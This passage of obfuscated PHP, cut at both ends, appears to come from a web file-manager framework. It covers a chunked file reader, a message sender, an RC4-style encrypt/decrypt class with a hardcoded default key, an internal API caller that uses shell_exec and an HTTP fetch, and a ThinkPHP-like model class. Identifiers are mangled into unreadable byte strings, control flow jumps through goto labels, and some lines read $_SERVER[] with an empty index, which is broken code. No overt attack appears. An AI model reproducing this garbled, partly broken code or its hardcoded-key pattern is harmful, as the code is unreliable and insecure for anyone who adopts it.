(isset(self::$fileInfo[$f¡†øç¦ô])) { return self::$fileInfo[$f¡†øç¦ô]; } if (substr($f¡†øç¦ô, 0, strlen($AÎ Ôä‡’Í)) != $AÎ Ôä‡’Í) { return !1; } self::$fileInfo[$f¡†øç¦ô] = IO::info(substr($f¡†øç¦ô, strlen($AÎ Ôä‡’Í))); return self::$fileInfo[$f¡†øç¦ô]; } public static function read($E¹Õ§¢Ü³á, $AñÂ»ç‹…, $F¬ß¾¿’¸) { goto DöˆÀÉ¡ÄÙ; C–Ñ¿Í”ğÂ: return $b…ªÜÎçÏù; goto aÇ™œÀÌ¢§; b¸³ã–‘ªÇ: $DøòªÃÌÖŸ = 8192; fseek($AÌËÙ‡´Ç, $AñÂ»ç‹…, SEEK_SET); $b…ªÜÎçÏù = $BÆµˆ¹Œ™—[33]; goto b¡Š’ŒÂë´; b¡Š’ŒÂë´: $fŠ‘•ëˆñõ = 0; while ($fŠ‘•ëˆñõ < $F¬ß¾¿’¸) { $CÑöÉ­³´ = min($DøòªÃÌÖŸ, $F¬ß¾¿’¸ - $fŠ‘•ëˆñõ); $b…ªÜÎçÏù .= fread($AÌËÙ‡´Ç, $CÑöÉ­³´); $fŠ‘•ëˆñõ += $CÑöÉ­³´; } fclose($AÌËÙ‡´Ç); goto C–Ñ¿Í”ğÂ; DöˆÀÉ¡ÄÙ: $BÆµˆ¹Œ™— =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÌËÙ‡´Ç = fopen($E¹Õ§¢Ü³á, $BÆµˆ¹Œ™—[1195]); if (!$AÌËÙ‡´Ç) { return $BÆµˆ¹Œ™—[33]; } goto b¸³ã–‘ªÇ; aÇ™œÀÌ¢§: } public function fileSubstr($eÁƒÏ‚¬×Ç, $C·Ë’ ¸‹) { goto fÂŞ‡È±™; eÉŒ‰ÛæÁó: if ($eÁƒÏ‚¬×Ç + $C·Ë’ ¸‹ > $C™×Õ³ß„„) { $C·Ë’ ¸‹ = $C™×Õ³ß„„ - $eÁƒÏ‚¬×Ç; } if ($C·Ë’ ¸‹ <= 0) { return $Fƒ’®–Êç[33]; } if ($eÁƒÏ‚¬×Ç < 0 || $eÁƒÏ‚¬×Ç >= $C™×Õ³ß„„ || $C·Ë’ ¸‹ <= 0 || $C·Ë’ ¸‹ > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\x69\154\x65\122\145\141\x64\40\145\x72\162\157\162\41\40\x73\x74\141\x72\164\x3d{$eÁƒÏ‚¬×Ç}\x3b\154\145\x6e\147\x74\x68\x3d{$C·Ë’ ¸‹}\73\x20\163\151\x7a\145\x3d{$C™×Õ³ß„„}\x3b"); } goto A”¢«‡’‹; f ø’ÈÁ Æ: $cñŸ¾ÓÕäÀ = $C·Ë’ ¸‹; if ($eÁƒÏ‚¬×Ç < 0) { $eÁƒÏ‚¬×Ç = $C™×Õ³ß„„ + $eÁƒÏ‚¬×Ç; } if ($C·Ë’ ¸‹ === !1) { $C·Ë’ ¸‹ = $C™×Õ³ß„„ - $eÁƒÏ‚¬×Ç; } goto eÉŒ‰ÛæÁó; bè‘îØ‡: $Eº¿Ú®‹ö = 0; $B ß‰ƒ„ø° = 0; $D·¡‡µÕãÌ = $Fƒ’®–Êç[33]; goto DÖÊÄ´¡÷«; BÑ„¹ÎíÏŠ: ksort($A†§ÓƒŸ ); $a±¬è„ù´ = substr($D³óÚÈÏáÈ, $eÁƒÏ‚¬×Ç - $AÙºòÙ«òÛ, $C·Ë’ ¸‹); return $a±¬è„ù´; goto FÊ“Ş¨§à½; fÂŞ‡È±™: $Fƒ’®–Êç =& $_SERVER[åÌÛ»ô¢‚ö™]; $C™×Õ³ß„„ = $this->info[$Fƒ’®–Êç[77]]; $eªÏÈò¾é¸ = $eÁƒÏ‚¬×Ç; goto f ø’ÈÁ Æ; A”¢«‡’‹: $c£Œ´’›³“ = 64 * 1024; $A†§ÓƒŸ  =& self::$_chunkBuffer[$this->path]; if (!$A†§ÓƒŸ ) { $A†§ÓƒŸ  = array(); } goto bè‘îØ‡; fÒ‚¹ÚÊ¼: $e… Í’Ô±™ = ceil(($eÁƒÏ‚¬×Ç + $C·Ë’ ¸‹) / $c£Œ´’›³“) * $c£Œ´’›³“ - $AÙºòÙ«òÛ; $D³óÚÈÏáÈ = IO::fileSubstr($this->path, $AÙºòÙ«òÛ, $e… Í’Ô±™); $A†§ÓƒŸ [$AÙºòÙ«òÛ . $Fƒ’®–Êç[33]] = $D³óÚÈÏáÈ; goto BÑ„¹ÎíÏŠ; DÖÊÄ´¡÷«: foreach ($A†§ÓƒŸ  as $Eº¿Ú®‹ö => $D·¡‡µÕãÌ) { $Eº¿Ú®‹ö = intval($Eº¿Ú®‹ö); $B ß‰ƒ„ø° = $Eº¿Ú®‹ö + strlen($D·¡‡µÕãÌ); if ($eÁƒÏ‚¬×Ç >= $B ß‰ƒ„ø°) { continue; } if ($eÁƒÏ‚¬×Ç >= $Eº¿Ú®‹ö && $eÁƒÏ‚¬×Ç + $C·Ë’ ¸‹ <= $B ß‰ƒ„ø°) { return substr($D·¡‡µÕãÌ, $eÁƒÏ‚¬×Ç - $Eº¿Ú®‹ö, $C·Ë’ ¸‹); } break; } if (count($A†§ÓƒŸ ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Fƒ’®–Êç[1326], $Fƒ’®–Êç[1327] . count($A†§ÓƒŸ ) . "\x3b\x73\164\141\162\164\x3d{$eÁƒÏ‚¬×Ç}\x2c\x6c\145\x6e\147\164\150\75{$C·Ë’ ¸‹}\73\160\157\x73\x65\72{$Eº¿Ú®‹ö}\x7e{$B ß‰ƒ„ø°}"); throw new Exception($Fƒ’®–Êç[1328]); } $AÙºòÙ«òÛ = intval($eÁƒÏ‚¬×Ç / $c£Œ´’›³“) * $c£Œ´’›³“; goto fÒ‚¹ÚÊ¼; FÊ“Ş¨§à½: } private function log($dí¦ô¡é™Í, $E™Š†á¾à‚) { $F‹ÕÈî¨ëç =& $_SERVER[åÌÛ»ô¢‚ö™]; $FöÑÚòƒ = timeFloat() - $this->timeStart; write_log(sprintf($F‹ÕÈî¨ëç[1329], $dí¦ô¡é™Í, $this->info[$F‹ÕÈî¨ëç[28]], $FöÑÚòƒ, $E™Š†á¾à‚), $F‹ÕÈî¨ëç[1245]); } } class Message { function __construct() { } public function send($b¸âá›ÃßŠ = '', $D¨ĞÌ Å = array(), $b³ÍÁêØ = "\x74\x65\x78\164") { goto C÷ŠâŸ; A–äåÛ¦Ï•: Hook::trigger($A¦´£¥í•º[1333], $a¢±âÈŞ…); goto A­ÃÇ‹¤¬É; d¥¡Äí´”æ: $D¨ĞÌ Å = array($A¦´£¥í•º[993] => isset($D¨ĞÌ Å[$A¦´£¥í•º[993]]) ? $D¨ĞÌ Å[$A¦´£¥í•º[993]] : $A¦´£¥í•º[33], $A¦´£¥í•º[560] => isset($D¨ĞÌ Å[$A¦´£¥í•º[560]]) ? $D¨ĞÌ Å[$A¦´£¥í•º[560]] : $A¦´£¥í•º[33]); if (empty($b¸âá›ÃßŠ) || empty($D¨ĞÌ Å[$A¦´£¥í•º[993]]) && empty($D¨ĞÌ Å[$A¦´£¥í•º[560]])) { return !1; } $a¢±âÈŞ… = array($A¦´£¥í•º[1272] => $d‰ŒëèôÔ¤, $A¦´£¥í•º[1332] => $D¨ĞÌ Å); goto A–äåÛ¦Ï•; C÷ŠâŸ: $A¦´£¥í•º =& $_SERVER[åÌÛ»ô¢‚ö™]; $d‰ŒëèôÔ¤ = array($A¦´£¥í•º[29] => $A¦´£¥í•º[1330], $A¦´£¥í•º[719] => $b¸âá›ÃßŠ); if (in_array($b³ÍÁêØ, array($A¦´£¥í•º[1330], $A¦´£¥í•º[1331]))) { $d‰ŒëèôÔ¤[$A¦´£¥í•º[29]] = $b³ÍÁêØ; } goto d¥¡Äí´”æ; A­ÃÇ‹¤¬É: } } goto FòöŸÆò«‰; EÇÙŒ…ö: class Mcrypt { public static $defaultKey = "\141\41\164\x61\153\101\72\x64\x6c\155\143\154\x64\x45\166\54\145"; public static function encode($CëŸŒ¸¬Ü , $Aô£©¶¦ù = '', $bš¸¤ê‘•ô = 0, $DˆÆ§é·ƒ = '', $B¢Ğ‹½ÀÕå = true) { goto dÇçôÚ³†¼; dÇçôÚ³†¼: $F°‰‚ƒà¡÷ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($B¢Ğ‹½ÀÕå) { $CëŸŒ¸¬Ü  = rawurlencode($CëŸŒ¸¬Ü ); } $Bƒ“»áÑ¦ = 4; goto BùëÓÚ’™İ; A„©ÂÓ¸´¬: $DˆÆ§é·ƒ = $DˆÆ§é·ƒ ? $DˆÆ§é·ƒ : md5(microtime()); $B¤‘†»Óëè = substr($DˆÆ§é·ƒ, -$Bƒ“»áÑ¦); $B•­‡¥Œõ— = $bÃ ™ñÈ§¡ . md5($bÃ ™ñÈ§¡ . $B¤‘†»Óëè); goto DŞ‡ò¼æè¡; DŞ‡ò¼æè¡: $a«³Ãˆãì• = strlen($B•­‡¥Œõ—); $CëŸŒ¸¬Ü  = sprintf($F°‰‚ƒà¡÷[1964], $bš¸¤ê‘•ô ? $bš¸¤ê‘•ô + time() : 0) . substr(md5($CëŸŒ¸¬Ü  . $fšë’µÓğ), 0, 16) . $CëŸŒ¸¬Ü ; $d‹Äœ¬¹Û = strlen($CëŸŒ¸¬Ü ); goto cğ†­ª–ï; BùëÓÚ’™İ: $Aô£©¶¦ù = md5($Aô£©¶¦ù ? $Aô£©¶¦ù : self::$defaultKey); $bÃ ™ñÈ§¡ = md5(substr($Aô£©¶¦ù, 0, 16)); $fšë’µÓğ = md5(substr($Aô£©¶¦ù, 16, 16)); goto A„©ÂÓ¸´¬; BŸ•åô”Ú: $céŠ—ø× = $B¤‘†»Óëè . str_replace($F°‰‚ƒà¡÷[929], $F°‰‚ƒà¡÷[33], base64_encode($céŠ—ø×)); $céŠ—ø× = str_replace(array($F°‰‚ƒà¡÷[299], $F°‰‚ƒà¡÷[8], $F°‰‚ƒà¡÷[929]), array($F°‰‚ƒà¡÷[437], $F°‰‚ƒà¡÷[70], $F°‰‚ƒà¡÷[91]), $céŠ—ø×); return $céŠ—ø×; goto CÙô‡‚­; cğ†­ª–ï: $f‡Æ‡“÷ø = array(); for ($AÉÔµ™ÑĞš = 0; $AÉÔµ™ÑĞš <= 255; $AÉÔµ™ÑĞš++) { $f‡Æ‡“÷ø[$AÉÔµ™ÑĞš] = ord($B•­‡¥Œõ—[$AÉÔµ™ÑĞš % $a«³Ãˆãì•]); } $eíŠøŠ††æ = range(0, 255); goto D±ÁôÁãŞ; D±ÁôÁãŞ: for ($C˜Ë·ªÃó™ = $AÉÔµ™ÑĞš = 0; $AÉÔµ™ÑĞš < 256; $AÉÔµ™ÑĞš++) { $C˜Ë·ªÃó™ = ($C˜Ë·ªÃó™ + $eíŠøŠ††æ[$AÉÔµ™ÑĞš] + $f‡Æ‡“÷ø[$AÉÔµ™ÑĞš]) % 256; $eĞõš¨æÈÑ = $eíŠøŠ††æ[$AÉÔµ™ÑĞš]; $eíŠøŠ††æ[$AÉÔµ™ÑĞš] = $eíŠøŠ††æ[$C˜Ë·ªÃó™]; $eíŠøŠ††æ[$C˜Ë·ªÃó™] = $eĞõš¨æÈÑ; } $céŠ—ø× = $F°‰‚ƒà¡÷[33]; for ($a…„µöá« = $C˜Ë·ªÃó™ = $AÉÔµ™ÑĞš = 0; $AÉÔµ™ÑĞš < $d‹Äœ¬¹Û; $AÉÔµ™ÑĞš++) { $a…„µöá« = ($a…„µöá« + 1) % 256; $C˜Ë·ªÃó™ = ($C˜Ë·ªÃó™ + $eíŠøŠ††æ[$a…„µöá«]) % 256; $eĞõš¨æÈÑ = $eíŠøŠ††æ[$a…„µöá«]; $eíŠøŠ††æ[$a…„µöá«] = $eíŠøŠ††æ[$C˜Ë·ªÃó™]; $eíŠøŠ††æ[$C˜Ë·ªÃó™] = $eĞõš¨æÈÑ; $céŠ—ø× .= chr(ord($CëŸŒ¸¬Ü [$AÉÔµ™ÑĞš]) ^ $eíŠøŠ††æ[($eíŠøŠ††æ[$a…„µöá«] + $eíŠøŠ††æ[$C˜Ë·ªÃó™]) % 256]); } goto BŸ•åô”Ú; CÙô‡‚­: } public static function decode($DïÎ¶¦Šó, $Eš¤ÙË³œÊ = '', $f‚‡¦Åß® = true) { goto DĞº™Ò¿¼; D–Ş‡óŸ: for ($AäÌå¯ƒÚ = 0; $AäÌå¯ƒÚ <= 255; $AäÌå¯ƒÚ++) { $FÒåöåÇ®è[$AäÌå¯ƒÚ] = ord($fÄäÀˆÀ“ñ[$AäÌå¯ƒÚ % $dÂóÇÁâ¥]); } $cÔ—‘›çšà = range(0, 255); for ($D‘…àœãø = $AäÌå¯ƒÚ = 0; $AäÌå¯ƒÚ < 256; $AäÌå¯ƒÚ++) { $D‘…àœãø = ($D‘…àœãø + $cÔ—‘›çšà[$AäÌå¯ƒÚ] + $FÒåöåÇ®è[$AäÌå¯ƒÚ]) % 256; $c½Éß¨’¢ = $cÔ—‘›çšà[$AäÌå¯ƒÚ]; $cÔ—‘›çšà[$AäÌå¯ƒÚ] = $cÔ—‘›çšà[$D‘…àœãø]; $cÔ—‘›çšà[$D‘…àœãø] = $c½Éß¨’¢; } goto dÂ¶ÊÅ…èÃ; dêÖĞ×ŸŠç: $DïÎ¶¦Šó = base64_decode(substr($DïÎ¶¦Šó, $e ğÂ¦Áâ)); $a‚Ú±Šâ†Ö = strlen($DïÎ¶¦Šó); $FÒåöåÇ®è = array(); goto D–Ş‡óŸ; aÊËæÔ©÷: $BÛêïè¥…ì = substr($DïÎ¶¦Šó, 0, $e ğÂ¦Áâ); $fÄäÀˆÀ“ñ = $Aê‡à±âÎ¥ . md5($Aê‡à±âÎ¥ . $BÛêïè¥…ì); $dÂóÇÁâ¥ = strlen($fÄäÀˆÀ“ñ); goto dêÖĞ×ŸŠç; Dº„„Çšâ : $Eš¤ÙË³œÊ = md5($Eš¤ÙË³œÊ ? $Eš¤ÙË³œÊ : self::$defaultKey); $Aê‡à±âÎ¥ = md5(substr($Eš¤ÙË³œÊ, 0, 16)); $Eå¼Ÿ™ã… = md5(substr($Eš¤ÙË³œÊ, 16, 16)); goto aÊËæÔ©÷; dÂ¶ÊÅ…èÃ: $bÓøŒ‰Ğñ” = $D×ôÇÁÄ¥[33]; for ($CÁÈà— = $D‘…àœãø = $AäÌå¯ƒÚ = 0; $AäÌå¯ƒÚ < $a‚Ú±Šâ†Ö; $AäÌå¯ƒÚ++) { $CÁÈà— = ($CÁÈà— + 1) % 256; $D‘…àœãø = ($D‘…àœãø + $cÔ—‘›çšà[$CÁÈà—]) % 256; $c½Éß¨’¢ = $cÔ—‘›çšà[$CÁÈà—]; $cÔ—‘›çšà[$CÁÈà—] = $cÔ—‘›çšà[$D‘…àœãø]; $cÔ—‘›çšà[$D‘…àœãø] = $c½Éß¨’¢; $bÓøŒ‰Ğñ” .= chr(ord($DïÎ¶¦Šó[$AäÌå¯ƒÚ]) ^ $cÔ—‘›çšà[($cÔ—‘›çšà[$CÁÈà—] + $cÔ—‘›çšà[$D‘…àœãø]) % 256]); } $FóÒß“…× = intval(substr($bÓøŒ‰Ğñ”, 0, 10)); goto Dµ…¼îÅ—”; Dµ…¼îÅ—”: $Eß¨™––¬ = $D×ôÇÁÄ¥[33]; if (($FóÒß“…× == 0 || $FóÒß“…× - time() > 0) && substr($bÓøŒ‰Ğñ”, 10, 16) == substr(md5(substr($bÓøŒ‰Ğñ”, 26) . $Eå¼Ÿ™ã…), 0, 16)) { $Eß¨™––¬ = substr($bÓøŒ‰Ğñ”, 26); if ($f‚‡¦Åß®) { $Eß¨™––¬ = rawurldecode($Eß¨™––¬); } } return $Eß¨™––¬; goto AÂ„£³ÑÑ; DĞº™Ò¿¼: $D×ôÇÁÄ¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DïÎ¶¦Šó = str_replace(array($D×ôÇÁÄ¥[437], $D×ôÇÁÄ¥[70], $D×ôÇÁÄ¥[91]), array($D×ôÇÁÄ¥[299], $D×ôÇÁÄ¥[8], $D×ôÇÁÄ¥[929]), $DïÎ¶¦Šó); $e ğÂ¦Áâ = 4; goto Dº„„Çšâ ; AÂ„£³ÑÑ: } } define($_SERVER[åÌÛ»ô¢‚ö™][1965], 1); define($_SERVER[åÌÛ»ô¢‚ö™][1966], 2); goto eåº¤º÷­„; fØ‰ìùôá: function ActionCall($a¢µˆï÷™™) { $cÙê¥†¬š‚ = array_slice(func_get_args(), 1); return ActionApply($a¢µˆï÷™™, $cÙê¥†¬š‚); } function ActionCallApi($dê¿‰Æ·, $a”õ±Î¬© = '') { goto d½åçò°ï¼; d½åçò°ï¼: $EÆô–± Ïô =& $_SERVER[]; $CÂ°Ëã·Æ = $a”õ±Î¬©; if (is_array($a”õ±Î¬©)) { $CÂ°Ëã·Æ = $EÆô–± Ïô[16]; foreach ($a”õ±Î¬© as $BŒ¾š†øœƒ => $Dùñ•†Æ„) { $Dùñ•†Æ„ = is_array($Dùñ•†Æ„) ? json_encode($Dùñ•†Æ„) : $Dùñ•†Æ„; $Dùñ•†Æ„ = is_bool($Dùñ•†Æ„) ? intval($Dùñ•†Æ„) : $Dùñ•†Æ„; $CÂ°Ëã·Æ .= $EÆô–± Ïô[17] . $BŒ¾š†øœƒ . $EÆô–± Ïô[18] . rawurlencode($Dùñ•†Æ„); } } goto AÃ”µ¶çÉ¶; A®£öÅæ„: return $bÎÇÈÇŠÌ’; goto CÁíÒ×ŒÎÑ; D™¡²–±„Ä: $eƒ´Ëâ’“À = json_decode($eê‹àçíœ©, !0); $bÎÇÈÇŠÌ’ = is_array($eƒ´Ëâ’“À) ? $eƒ´Ëâ’“À : array($EÆô–± Ïô[29] => null, $EÆô–± Ïô[30] => $eê‹àçíœ©); if (!$eƒ´Ëâ’“À) { echo $eê‹àçíœ©; } goto A®£öÅæ„; Dê–øêğ¥: $c¡©­Å­†ù = phpBinCommand(); if ($c¡©­Å­†ù && function_exists($EÆô–± Ïô[21])) { $F„…Á‚˜ = $c¡©­Å­†ù . $EÆô–± Ïô[22] . BASIC_PATH . $EÆô–± Ïô[23] . escapeshellarg($dê¿‰Æ·); $eê‹àçíœ© = shell_exec($F„…Á‚˜); } if (!$eê‹àçíœ©) { $A¾Õ†¸æ£ = stream_context_create(array($EÆô–± Ïô[24] => array($EÆô–± Ïô[25] => 20, $EÆô–± Ïô[26] => $EÆô–± Ïô[27]))); $eê‹àçíœ© = file_get_contents(APP_HOST . $EÆô–± Ïô[28] . $dê¿‰Æ·, !1, $A¾Õ†¸æ£); } goto D™¡²–±„Ä; AÃ”µ¶çÉ¶: $bÉßŞâŸŒÒ = Action($EÆô–± Ïô[19])->accessToken(); $dê¿‰Æ· = str_replace($EÆô–± Ïô[5], $EÆô–± Ïô[4], $dê¿‰Æ·) . $EÆô–± Ïô[20] . $bÉßŞâŸŒÒ . $CÂ°Ëã·Æ; $eê‹àçíœ© = $EÆô–± Ïô[16]; goto Dê–øêğ¥; CÁíÒ×ŒÎÑ: } function ActionCallHook($dôè¿¨î­Ÿ) { goto f”¯‚Ã‘“‚; AÎñš®®Ü: $f‘İø‰À£² = $e®æô§·¦ñ ? json_decode($e®æô§·¦ñ, !0) : $f‘İø‰À£²; $GLOBALS[$BñÀ²ŒÒÎÙ[31]] = 0; return $f‘İø‰À£²; goto C®×šäß£; f”¯‚Ã‘“‚: $BñÀ²ŒÒÎÙ =& $_SERVER[]; ob_start(); $D¢ùÒÒ„Í“ = array_slice(func_get_args(), 1); goto dÖó…¸ÈÇ; dÖó…¸ÈÇ: $GLOBALS[$BñÀ²ŒÒÎÙ[31]] = 1; $f‘İø‰À£² = ActionApply($dôè¿¨î­Ÿ, $D¢ùÒÒ„Í“); $e®æô§·¦ñ = ob_get_clean(); goto AÎñš®®Ü; C®×šäß£: } goto B…¤š¼ÛÇ; cô¹ŞÎï­¦: define($_SERVER[åÌÛ»ô¢‚ö™][245], 0); define($_SERVER[åÌÛ»ô¢‚ö™][246], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\x6f\x72\144\x65\x72", "\141\154\x69\141\163", "\150\141\166\x69\156\147", "\x67\x72\157\x75\160", "\154\x6f\x63\153", "\144\x69\163\x74\x69\156\x63\x74", "\141\165\164\x6f", "\146\x69\154\x74\x65\162", "\x76\141\x6c\x69\144\141\164\145", "\x72\145\x73\165\x6c\x74", "\x62\x69\x6e\x64", "\164\x6f\x6b\145\156"); public function __construct($b†à„ÀÏ = '', $DÕ··Ğ÷ª‘ = '', $f’µŞ¹Õ¼ã = '') { $aîÚƒÄÀêˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->_initialize(); if (!empty($b†à„ÀÏ)) { if (strpos($b†à„ÀÏ, $aîÚƒÄÀêˆ[91])) { list($this->dbName, $this->name) = explode($aîÚƒÄÀêˆ[91], $b†à„ÀÏ); } else { $this->name = $b†à„ÀÏ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($DÕ··Ğ÷ª‘)) { $this->tablePrefix = $aîÚƒÄÀêˆ[33]; } elseif ($aîÚƒÄÀêˆ[33] != $DÕ··Ğ÷ª‘) { $this->tablePrefix = $DÕ··Ğ÷ª‘; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($aîÚƒÄÀêˆ[247]); } $this->db(0, empty($this->connection) ? $f’µŞ¹Õ¼ã : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Bª‚¡ºª¹­ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($this->fields)) { if (think_config($Bª‚¡ºª¹­[248])) { $c—º‡÷Š«¸ = $this->dbName ? $this->dbName : think_config($Bª‚¡ºª¹­[249]); $B¢•œ‘æ¾Ï = think_var_cache($Bª‚¡ºª¹­[250] . strtolower(get_path_this($c—º‡÷Š«¸) . $Bª‚¡ºª¹­[91] . $this->name)); if ($B¢•œ‘æ¾Ï) { $E†«Ê¿Å”¥ = think_config($Bª‚¡ºª¹­[251]); if (empty($E†«Ê¿Å”¥) || $B¢•œ‘æ¾Ï[$Bª‚¡ºª¹­[252]] == $E†«Ê¿Å”¥) { $this->fields = $B¢•œ‘æ¾Ï; return; } } } $this->flush(); } } public function flush() { goto BÏĞôˆªö; C«†ôÊ•½Ö: foreach ($C¾§ÒòˆØ as $F±¯šîëñ‰ => $AŠ“È•éºÛ) { $cÙßïİ[$F±¯šîëñ‰] = $AŠ“È•éºÛ[$B÷Ùƒ‰Ä[29]]; if ($AŠ“È•éºÛ[$B÷Ùƒ‰Ä[36]]) { $this->fields[$B÷Ùƒ‰Ä[254]] = $F±¯šîëñ‰; if ($AŠ“È•éºÛ[$B÷Ùƒ‰Ä[39]]) { $this->fields[$B÷Ùƒ‰Ä[253]] = !0; } } } $this->fields[$B÷Ùƒ‰Ä[255]] = $cÙßïİ; if (think_config($B÷Ùƒ‰Ä[251])) { $this->fields[$B÷Ùƒ‰Ä[252]] = think_config($B÷Ùƒ‰Ä[251]); } goto EœËÉ™; EœËÉ™: if (think_config($B÷Ùƒ‰Ä[248])) { $bé¡ê”æ’ = $this->dbName ? $this->dbName : think_config($B÷Ùƒ‰Ä[249]); think_var_cache($B÷Ùƒ‰Ä[250] . strtolower(get_path_this($bé¡ê”æ’) . $B÷Ùƒ‰Ä[91] . $this->name), $this->fields); } goto D¬ó¹‡ª®Ô; BÏĞôˆªö: $B÷Ùƒ‰Ä =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->db->setModel($this->name); $C¾§ÒòˆØ = $this->db->getFields($this->getTableName()); goto a‡®¦ì¶ ‹; a‡®¦ì¶ ‹: if (!$C¾§ÒòˆØ) { return !1; } $this->fields = array_keys($C¾§ÒòˆØ); $this->fields[$B÷Ùƒ‰Ä[253]] = !1; goto C«†ôÊ•½Ö; D¬ó¹‡ª®Ô: } public function switchModel($Bé§½é‹¦, $CœÔŠ†¹ = array()) { $dÈ˜ˆ¼Ã®Ä =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÊ·š¯Ô»ä = ucwords(strtolower($Bé§½é‹¦)) . $dÈ˜ˆ¼Ã®Ä[256]; if (!class_exists($bÊ·š¯Ô»ä)) { think_exception($bÊ·š¯Ô»ä . think_lang($dÈ˜ˆ¼Ã®Ä[257])); } $this->_extModel = new $bÊ·š¯Ô»ä($this->name); if (!empty($CœÔŠ†¹)) { foreach ($CœÔŠ†¹ as $Dæ¨íÎ¼°¬) { $this->_extModel->setProperty($Dæ¨íÎ¼°¬, $this->{$Dæ¨íÎ¼°¬}); } } return $this->_extModel; } public function __set($bã×Š•ª‚‚, $Eõ‰ŒÂ© ô) { $this->data[$bã×Š•ª‚‚] = $Eõ‰ŒÂ© ô; } public function __get($d˜‘í‚£Ë) { return isset($this->data[$d˜‘í‚£Ë]) ? $this->data[$d˜‘í‚£Ë] : null; } public function __isset($fÉò‹ƒßŞ) { return isset($this->data[$fÉò‹ƒßŞ]); } public function __unset($bœ—Ëî¿±§) { unset($this->data[$bœ—Ëî¿±§]); } public function __call($CĞÉ§ƒ¾Šê, $e¿Ö‹¢›Óá) { $fÇë‹®¥Šç =& $_SERVER[åÌÛ»ô¢‚ö™]; if (in_array(strtolower($CĞÉ§ƒ¾Šê), $this->methods, !0)) { $this->options[strtolower($CĞÉ§ƒ¾Šê)] = $e¿Ö‹¢›Óá[0]; return $this; } elseif (in_array(strtolower($CĞÉ§ƒ¾Šê), array($fÇë‹®¥Šç[258], $fÇë‹®¥Šç[259], $fÇë‹®¥Šç[260], $fÇë‹®¥Šç[261], $fÇë‹®¥Šç[262]), !0)) { $AÇ»›° = isset($e¿Ö‹¢›Óá[0]) ? $e¿Ö‹¢›Óá[0] : $fÇë‹®¥Šç[190]; $AÇ»›° = $this->db->parseKey($AÇ»›°); return $this->getField(strtoupper($CĞÉ§ƒ¾Šê) . $fÇë‹®¥Šç[263] . $AÇ»›° . $fÇë‹®¥Šç[264] . $CĞÉ§ƒ¾Šê, $fÇë‹®¥Šç[258]); } elseif (strtolower(substr($CĞÉ§ƒ¾Šê, 0, 5)) == $fÇë‹®¥Šç[265]) { $AÇ»›° = think_parse_name(substr($CĞÉ§ƒ¾Šê, 5)); $d…è¯ëÆ[$AÇ»›°] = $e¿Ö‹¢›Óá[0]; return $this->where($d…è¯ëÆ)->find(); } elseif (strtolower(substr($CĞÉ§ƒ¾Šê, 0, 10)) == $fÇë‹®¥Šç[266]) { $cğ¸ÙÈò›­ = think_parse_name(substr($CĞÉ§ƒ¾Šê, 10)); $d…è¯ëÆ[$cğ¸ÙÈò›­] = $e¿Ö‹¢›Óá[0]; return $this->where($d…è¯ëÆ)->getField($e¿Ö‹¢›Óá[1]); } elseif (isset($this->_scope[$CĞÉ§ƒ¾Šê])) { return $this->scope($CĞÉ§ƒ¾Šê, $e¿Ö‹¢›Óá[0]); } elseif (method_exists($this, $CĞÉ§ƒ¾Šê)) { array_unshift($e¿Ö‹¢›Óá, $CĞÉ§ƒ¾Šê); return call_user_func_array(array($this, $fÇë‹®¥Šç[267]), $e¿Ö‹¢›Óá); } else { return call_user_func_array(array(parent, $CĞÉ§ƒ¾Šê), $e¿Ö‹¢›Óá); } } protected function call() { goto dËº¹í²ÚÔ; Cñóó¸Å…Æ: $A°°ƒšñ‰ç = $AŒå’ŒÔ‡Û; if (is_array($AŒå’ŒÔ‡Û)) { $A°°ƒšñ‰ç = $AŒå’ŒÔ‡Û[1]; $AŒå’ŒÔ‡Û = $AŒå’ŒÔ‡Û[0]; } $c¹²ï‚Ó†Œ = count($Aë±ï Ã‰Ş) - 1; goto aêÓÚïğˆ»; dËº¹í²ÚÔ: $eÅ®Õ†áˆ­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aë±ï Ã‰Ş = func_get_args(); $AŒå’ŒÔ‡Û = array_shift($Aë±ï Ã‰Ş); goto Cñóó¸Å…Æ; c¥İ¿Ã›Â•: $DìŒ›­ÀÎ— = call_user_func_array(array($this, $AŒå’ŒÔ‡Û), $Aë±ï Ã‰Ş); if (method_exists($this, $eÅ®Õ†áˆ­[271])) { $bœšœõµ‚ƒ = call_user_func_array(array($this, $eÅ®Õ†áˆ­[272]), array($A°°ƒšñ‰ç, $Aë±ï Ã‰Ş, $DìŒ›­ÀÎ—)); if ($bœšœõµ‚ƒ) { return $bœšœõµ‚ƒ; } } return $DìŒ›­ÀÎ—; goto dÃ»ˆâ®çì; aêÓÚïğˆ»: if (isset($Aë±ï Ã‰Ş[$c¹²ï‚Ó†Œ]) && $Aë±ï Ã‰Ş[$c¹²ï‚Ó†Œ] === $AŒå’ŒÔ‡Û) { think_exception(__CLASS__ . $eÅ®Õ†áˆ­[4] . $AŒå’ŒÔ‡Û . think_lang($eÅ®Õ†áˆ­[268])); return; } $Aë±ï Ã‰Ş[] = $AŒå’ŒÔ‡Û; if (method_exists($this, $eÅ®Õ†áˆ­[269])) { $bœšœõµ‚ƒ = call_user_func_array(array($this, $eÅ®Õ†áˆ­[270]), array($A°°ƒšñ‰ç, $Aë±ï Ã‰Ş)); if (!is_null($bœšœõµ‚ƒ) && $bœšœõµ‚ƒ !== !1) { return $bœšœõµ‚ƒ; } } goto c¥İ¿Ã›Â•; dÃ»ˆâ®çì: } protected function _initialize() { } protected function 